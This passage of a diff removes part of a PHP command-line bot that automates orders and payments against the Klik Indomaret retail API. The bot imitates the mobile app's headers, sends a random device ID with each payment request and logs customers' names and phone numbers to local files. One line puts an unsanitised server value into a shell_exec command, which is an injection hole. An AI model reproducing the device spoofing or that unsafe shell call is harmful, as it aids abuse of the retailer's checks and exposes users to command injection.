-							echo @color('yellow', "pilih : ");
-							$jamambil = trim(fgets(STDIN));
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							if (strpos($cekasek[1], '"CustomerID":null')) {
-								//
-								// if (strpos($cekasek[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":1,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . $tgljmk . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":1,"RegionID":"' . $RegionId . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictId . ',"ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									echo @color('yellow', "DAFTAR HIDANGAN :\n");
-									echo @color('yellow', "[1] Isaku\n");
-									echo @color('yellow', "[2] BCA\n");
-									echo @color('yellow', "[3] REKPON\n");
-									echo @color('yellow', "pilih : ");
-									$bayar = trim(fgets(STDIN));
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											
-  $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											unlink('nganue.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$cekasek[1]}\n");
-							}
-							break;
-						case '2':
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							if ($gett[1] == '[]') {
-								$addid = '00000000-0000-0000-0000-000000000000';
-							} else {
-								$addidx = json_decode($gett[1]);
-								$addid = $addidx[0]->ID;
-							}
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":false,"StoreID":"' . $storeid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$jsone = json_decode($poss[1]);
-							//	echo "\n\n$poss[1]\n\n";
-							$ax1 = "0";
-							$ax2 = "4";
-							echo @color('yellow', "TANGGAL : \n");
-							for ($ax1; $ax1 < $ax2; $ax1++) {
-								$tanggale = $jsone->ResponseObject->ListSlot[$ax1]->DateLabel;
-								$tanggalex = $jsone->ResponseObject->ListSlot[$ax1]->DateDayLabel;
-								echo @color('nevy', "[{$ax1}]");
-								echo "=> ";
-								echo @color('yellow', "{$tanggale}");
-								echo "\n";
-								if ($tanggale == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "PILIH : ");
-							$tglee = trim(fgets(STDIN));
-							switch ($tglee) {
-								case '0':
-									$tgle = $jsone->ResponseObject->ListSlot[0]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[0]->DateLabel;
-									break;
-								case '1':
-									$tgle = $jsone->ResponseObject->ListSlot[1]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[1]->DateLabel;
-									break;
-								case '2':
-									$tgle = $jsone->ResponseObject->ListSlot[2]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[2]->DateLabel;
-									break;
-								case '3':
-									$tgle = $jsone->ResponseObject->ListSlot[3]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[3]->DateLabel;
-									break;
-								case '4':
-									$tgle = $jsone->ResponseObject->ListSlot[4]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[4]->DateLabel;
-									break;
-								case '5':
-									$tgle = $jsone->ResponseObject->ListSlot[5]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[5]->DateLabel;
-									break;
-							}
-							$jumuke = explode('T', $tgle);
-							$tgljmk = $jumuke[0];
-							echo @color('yellow', "{$tagalex}\n");
-							$axx1 = "0";
-							$axx2 = "14";
-							echo @color('yellow', "JAM AMBIL :\n");
-							for ($axx1; $axx1 < $axx2; $axx1++) {
-								$xs = $axx1 + 1;
-								$jame = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->SlotLabel;
-								$pesane = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->Message;
-								echo @color('nevy', "[{$xs}]");
-								echo "=> ";
-								echo @color('yellow', "{$jame}, ");
-								echo @color('red', "{$pesane}");
-								echo "\n";
-								if ($jame == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "pilih : ");
-							$jamambil = trim(fgets(STDIN));
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							if (strpos($poss[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":0,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . $tgljmk . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":0,"RegionID":"' . $RegionID . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictID . ',"StoreID":"' . $storeid . '","ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										//   echo "\n\n$getpay[1]\n\n";
-										//save("$getpay[1]", 'getpay.txt');
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									echo @color('yellow', "DAFTAR HIDANGAN :\n");
-									echo @color('yellow', "[1] ISAKU\n");
-									echo @color('yellow', "[2] BCA\n");
-									echo @color('red', "[3] REKPON\n");
-									echo @color('yellow', "[4] MANDIRI\n");
-									echo @color('yellow', "[5] OVO\n");
-									echo @color('yellow', "pilih : ");
-									$bayar = trim(fgets(STDIN));
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											//  $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.saku","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											echo "\n\n {$submitpay[1]}\n\n";
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											//	echo "\n\n $sttpay[1]\n\n";
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$lk}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											unlink('nganue.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											// $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"VTBMRI ","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":true,"Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"BCA Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											// echo "\n\n$submitpay[1]\n\n";
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-										case '4':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											//  $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"VTBMRI","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"Mandiri Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											// echo "\n\n $submitpay[1]\n\n";
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											//	echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='$lk'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											//	echo "\n\n $sttpay[1]\n\n";
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->PaymentAccountID;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $sttbayar . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksimandiri.txt');
-											unlink('nganue.txt');
-											break;
-										case '5':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
